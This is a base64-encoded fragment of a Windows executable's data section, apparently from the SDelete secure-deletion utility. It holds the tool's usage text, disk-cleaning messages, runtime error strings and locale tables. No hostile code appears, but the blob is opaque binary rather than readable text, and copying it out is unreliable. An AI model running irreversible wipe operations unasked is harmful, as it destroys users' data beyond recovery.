HQAdQBzAFQAbwBEAG8AcwBFAHIAcgBvAHIAIABlAG4AdAByAHkAIABwAG8AaQBuAHQAIABpAG4AIABOAFQARABMAEwALgBEAEwATAAKAAAATgBvACAAZgBpAGwAZQBzAC8AZgBvAGwAZABlAHIAcwAgAGYAbwB1AG4AZAAgAHQAaABhAHQAIABtAGEAdABjAGgAIAAlAHMALgAKAAAAAAAKAEMAbABlAGEAbgBpAG4AZwAgAGQAaQBzAGsAIAAlAHMAOgAKAAAAXABcAC4AXABQAGgAeQBzAGkAYwBhAGwARAByAGkAdgBlACUAcwAAAAoARQByAHIAbwByACAAbwBwAGUAbgBpAG4AZwAgAGQAaQBzAGsAIAAlAHMAOgAgAAAAAAAAAAAACgBFAHIAcgBvAHIAIABxAHUAZQByAHkAaQBuAGcAIABkAGkAcwBrACAAJQBzACAAcwBpAHoAZQA6ACAAAAAAAAoARQByAHIAbwByACAAYwBsAGUAYQBuAGkAbgBnACAAZABpAHMAawAgACUAcwA6ACAAAAAAAAAACgBNAGEAawBlACAAcwB1AHIAZQAgAHQAaABhAHQAIAB0AGgAZQAgAGQAaQBzAGsAIABoAGEAcwAgAG4AbwAgAGYAaQBsAGUAIABzAHkAcwB0AGUAbQAgAHYAbwBsAHUAbQBlAHMALgAKAAoAAAAAAA0AIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAAAA0ARABpAHMAawAgACUAcwAgAGMAbABlAGEAbgBlAGQALgAKAAAAAAB1AHMAYQBnAGUAOgAgAHMAZABlAGwAZQB0AGUAIABbAC0AcAAgAHAAYQBzAHMAZQBzAF0AIABbAC0AcgBdACAAWwAtAHMAXQAgAFsALQBxAF0AIAA8AGYAaQBsAGUAIABvAHIAIABkAGkAcgBlAGMAdABvAHIAeQA+ACAAWwAuAC4ALgBdAAoAAAAAAAAAAAAgACAAIAAgACAAIAAgAHMAZABlAGwAZQB0AGUAIABbAC0AcAAgAHAAYQBzAHMAZQBzAF0AIABbAC0AegB8AC0AYwAgAFsAcABlAHIAYwBlAG4AdAAgAGYAcgBlAGUAXQBdACAAPABkAHIAaQB2AGUAIABsAGUAdAB0AGUAcgAgAFsALgAuAC4AXQA+AAoAAAAgACAAIAAgACAAIAAgAHMAZABlAGwAZQB0AGUAIABbAC0AcAAgAHAAYQBzAHMAZQBzAF0AIABbAC0AegB8AC0AYwBdACAAPABwAGgAeQBzAGkAYwBhAGwAIABkAGkAcwBrACAAbgB1AG0AYgBlAHIAPgAKAAAAAAAAAAAAAAAAACAAIAAgAC0AYwAgACAAIAAgACAAIAAgACAAIABDAGwAZQBhAG4AIABmAHIAZQBlACAAcwBwAGEAYwBlAC4AIABTAHAAZQBjAGkAZgB5ACAAYQBuACAAbwBwAHQAaQBvAG4AIABhAG0AbwB1AG4AdAAgAG8AZgAgAHMAcABhAGMAZQAKAAAAAAAAAAAAAAAAACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AG8AIABsAGUAYQB2AGUAIABmAHIAZQBlACAAZgBvAHIAIAB1AHMAZQAgAGIAeQAgAGEAIAByAHUAbgBuAGkAbgBnACAAcwB5AHMAdABlAG0ALgAKAAAAAAAAAAAAAAAAAAAAIAAgACAALQBwACAAIAAgACAAIAAgACAAIAAgAFMAcABlAGMAaQBmAGkAZQBzACAAbgB1AG0AYgBlAHIAIABvAGYAIABvAHYAZQByAHcAcgBpAHQAZQAgAHAAYQBzAHMAZQBzACAAKABkAGUAZgBhAHUAbAB0ACAAaQBzACAAMQApAAoAAAAAAAAAAAAAAAAAIAAgACAALQByACAAIAAgACAAIAAgACAAIAAgAFIAZQBtAG8AdgBlACAAUgBlAGEAZAAtAE8AbgBsAHkAIABhAHQAdAByAGkAYgB1AHQAZQAKAAAAAAAAAAAAAAAAAAAAIAAgACAALQBzACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHUAcgBzAGUAIABzAHUAYgBkAGkAcgBlAGMAdABvAHIAaQBlAHMACgAAAAAAAAAgACAAIAAtAHoAIAAgACAAIAAgACAAIAAgACAAWgBlAHIAbwAgAGYAcgBlAGUAIABzAHAAYQBjAGUAIAAoAGcAbwBvAGQAIABmAG8AcgAgAHYAaQByAHQAdQBhAGwAIABkAGkAcwBrA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mVudEV4VwAAQ3JlYXRlU2VtYXBob3JlRXhXAAAAAAAAU2V0VGhyZWFkU3RhY2tHdWFyYW50ZWUAQ3JlYXRlVGhyZWFkcG9vbFRpbWVyAAAAU2V0VGhyZWFkcG9vbFRpbWVyAAAAAAAAV2FpdEZvclRocmVhZHBvb2xUaW1lckNhbGxiYWNrcwBDbG9zZVRocmVhZHBvb2xUaW1lcgAAAABDcmVhdGVUaHJlYWRwb29sV2FpdAAAAABTZXRUaHJlYWRwb29sV2FpdAAAAAAAAABDbG9zZVRocmVhZHBvb2xXYWl0AAAAAABGbHVzaFByb2Nlc3NXcml0ZUJ1ZmZlcnMAAAAAAAAAAEZyZWVMaWJyYXJ5V2hlbkNhbGxiYWNrUmV0dXJucwAAR2V0Q3VycmVudFByb2Nlc3Nvck51bWJlcgAAAAAAAABHZXRMb2dpY2FsUHJvY2Vzc29ySW5mb3JtYXRpb24AAENyZWF0ZVN5bWJvbGljTGlua1cAAAAAAFNldERlZmF1bHREbGxEaXJlY3RvcmllcwAAAAAAAAAARW51bVN5c3RlbUxvY2FsZXNFeAAAAAAAQ29tcGFyZVN0cmluZ0V4AEdldERhdGVGb3JtYXRFeABHZXRMb2NhbGVJbmZvRXgAR2V0VGltZUZvcm1hdEV4AEdldFVzZXJEZWZhdWx0TG9jYWxlTmFtZQAAAAAAAAAASXNWYWxpZExvY2FsZU5hbWUAAAAAAAAATENNYXBTdHJpbmdFeAAAAEdldEN1cnJlbnRQYWNrYWdlSWQAAAAAAEdldFRpY2tDb3VudDY0AABHZXRGaWxlSW5mb3JtYXRpb25CeUhhbmRsZUV4VwAAAFNldEZpbGVJbmZvcm1hdGlvbkJ5SGFuZGxlVwAAAAAAAAAAAAAAAAACAAAAAAAAAGC3AkABAAAACAAAAAAAAADAtwJAAQAAAAkAAAAAAAAAILgCQAEAAAAKAAAAAAAAAIC4AkABAAAAEAAAAAAAAADQuAJAAQAAABEAAAAAAAAAMLkCQAEAAAASAAAAAAAAAJC5AkABAAAAEwAAAAAAAADguQJAAQAAABgAAAAAAAAAQLoCQAEAAAAZAAAAAAAAALC6AkABAAAAGgAAAAAAAAAAuwJAAQAAABsAAAAAAAAAcLsCQAEAAAAcAAAAAAAAAOC7AkABAAAAHgAAAAAAAAAwvAJAAQAAAB8AAAAAAAAAcLwCQAEAAAAgAAAAAAAAAEC9AkABAAAAIQAAAAAAAACwvQJAAQAAACIAAAAAAAAAoL8CQAEAAAB4AAAAAAAAAAjAAkABAAAAeQAAAAAAAAAowAJAAQAAAHoAAAAAAAAASMACQAEAAAD8AAAAAAAAAGTAAkABAAAA/wAAAAAAAABwwAJAAQAAAFIANgAwADAAMgANAAoALQAgAGYAbABvAGEAdABpAG4AZwAgAHAAbwBpAG4AdAAgAHMAdQBwAHAAbwByAHQAIABuAG8AdAAgAGwAbwBhAGQAZQBkAA0ACgAAAAAAAAAAAFIANgAwADAAOAANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGEAcgBnAHUAbQBlAG4AdABzAA0ACgAAAAAAAAAAAAAAAAAAAFIANgAwADAAOQANAAoALQAgAG4AbwB0ACAAZQBuAG8AdQBnAGgAIABzAHAAYQBjAGUAIABmAG8AcgAgAGUAbgB2AGkAcgBvAG4AbQBlAG4AdAANAAoAAAAAAAAAAAAAAFIANgAwADEAMAANAAoALQAgAGEAYgBvAHIAdAAoACkAIABoAGEAcwAgAGIAZQBlAG4AIABjAGEAbABsAGUAZAANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMQA2AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAdABoAHIAZQBhAGQAIABkAGEAdABhAA0ACgAAAAAAAAAAAAAAUgA2ADAAMQA3AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAG0AdQBsAHQAaQB0AGgAcgBlAGEAZAAgAGwAbwBjAGsAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAUgA2ADAAMQA4AA0ACgAtACAAdQBuAGUAeABwAGUAYwB0AGUAZAAgAGgAZQBhAHAAIABlAHIAcgBvAHIADQAKAAAAAAAAAAAAAAAAAAAAAABSADYAMAAxADkADQAKAC0AIAB1AG4AYQBiAGwAZQAgAHQAbwAgAG8AcABlAG4AIABjAG8AbgBzAG8AbABlACAAZABlAHYAaQBjAGUADQAKAAAAAAAAAAAAAAAAAAAAAABSADYAMAAyADQADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABfAG8AbgBlAHgAaQB0AC8AYQB0AGUAeABpAHQAIAB0AGEAYgBsAGUADQAKAAAAAAAAAAAAUgA2ADAAMgA1AA0ACgAtACAAcAB1AHIAZQAgAHYAaQByAHQAdQBhAGwAIABmAHUAbgBjAHQAaQBvAG4AIABjAGEAbABsAA0ACgAAAAAAAABSADYAMAAyADYADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABzAHQAZABpAG8AIABpAG4AaQB0AGkAYQBsAGkAegBhAHQAaQBvAG4ADQAKAAAAAAAAAAAAUgA2ADAAMgA3AA0ACgAtACAAbgBvAHQAIABlAG4AbwB1AGcAaAAgAHMAcABhAGMAZQAgAGYAbwByACAAbABvAHcAaQBvACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAA0ACgAAAAAAAAAAAFIANgAwADIAOAANAAoALQAgAHUAbgBhAGIAbABlACAAdABvACAAaQBuAGkAdABpAGEAbABpAHoAZQAgAGgAZQBhAHAADQAKAAAAAAAAAAAAUgA2ADAAMwAwAA0ACgAtACAAQwBSAFQAIABuAG8AdAAgAGkAbgBpAHQAaQBhAGwAaQB6AGUAZAANAAoAAAAAAFIANgAwADMAMQANAAoALQAgAEEAdAB0AGUAbQBwAHQAIAB0AG8AIABpAG4AaQB0AGkAYQBsAGkAegBlACAAdABoAGUAIABDAFIAVAAgAG0AbwByAGUAIAB0AGgAYQBuACAAbwBuAGMAZQAuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuAA0ACgAAAAAAAAAAAAAAAABSADYAMAAzADIADQAKAC0AIABuAG8AdAAgAGUAbgBvAHUAZwBoACAAcwBwAGEAYwBlACAAZgBvAHIAIABsAG8AYwBhAGwAZQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgANAAoAAAAAAAAAAAAAAAAAUgA2ADAAMwAzAA0ACgAtACAAQQB0AHQAZQBtAHAAdAAgAHQAbwAgAHUAcwBlACAATQBTAEkATAAgAGMAbwBkAGUAIABmAHIAbwBtACAAdABoAGkAcwAgAGEAcwBzAGUAbQBiAGwAeQAgAGQAdQByAGkAbgBnACAAbgBhAHQAaQB2AGUAIABjAG8AZABlACAAaQBuAGkAdABpAGEAbABpAHoAYQB0AGkAbwBuAAoAVABoAGkAcwAgAGkAbgBkAGkAYwBhAHQAZQBzACAAYQAgAGIAdQBnACAAaQBuACAAeQBvAHUAcgAgAGEAcABwAGwAaQBjAGEAdABpAG8AbgAuACAASQB0ACAAaQBzACAAbQBvAHMAdAAgAGwAaQBrAGUAbAB5ACAAdABoAGUAIAByAGUAcwB1AGwAdAAgAG8AZgAgAGMAYQBsAGwAaQBuAGcAIABhAG4AIABNAFMASQBMAC0AYwBvAG0AcABpAGwAZQBkACAAKAAvAGMAbAByACkAIABmAHUAbgBjAHQAaQBvAG4AIABmAHIAbwBtACAAYQAgAG4AYQB0AGkAdgBlACAAYwBvAG4AcwB0AHIAdQBjAHQAbwByACAAbwByACAAZgByAG8AbQAgAEQAbABsAE0AYQBpAG4ALgANAAoAAAAAAFIANgAwADMANAANAAoALQAgAGkAbgBjAG8AbgBzAGkAcwB0AGUAbgB0ACAAbwBuAGUAeABpAHQAIABiAGUAZwBpAG4ALQBlAG4AZAAgAHYAYQByAGkAYQBiAGwAZQBzAA0ACgAAAAAARABPAE0AQQBJAE4AIABlAHIAcgBvAHIADQAKAAAAAABTAEkATgBHACAAZQByAHIAbwByAA0ACgAAAAAAAAAAAFQATABPAFMAUwAgAGUAcgByAG8AcgANAAoAAAANAAoAAAAAAAAAAAByAHUAbgB0AGkAbQBlACAAZQByAHIAbwByACAAAAAAAFIAdQBuAHQAaQBtAGUAIABFAHIAcgBvAHIAIQAKAAoAUAByAG8AZwByAGEAbQA6ACAAAAAAAAAAPABwAHIAbwBnAHIAYQBtACAAbgBhAG0AZQAgAHUAbgBrAG4AbwB3AG4APgAAAAAALgAuAC4AAAAKAAoAAAAAAAAAAAAAAAAATQBpAGMAcgBvAHMAbwBmAHQAIABWAGkAcwB1AGEAbAAgAEMAKwArACAAUgB1AG4AdABpAG0AZQAgAEwAaQBiA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACAAIAAoACgAKAAoACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACEAIQAhACEAIQAhACEAIQAhACEABAAEAAQABAAEAAQABAAgQCBAIEAgQCBAIEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABABAAEAAQABAAEAAQAIIAggCCAIIAggCCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAQABAAEAAQACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAKAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEBgQGBAYEBgQGBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEQABAAEAAQABAAEACCAYIBggGCA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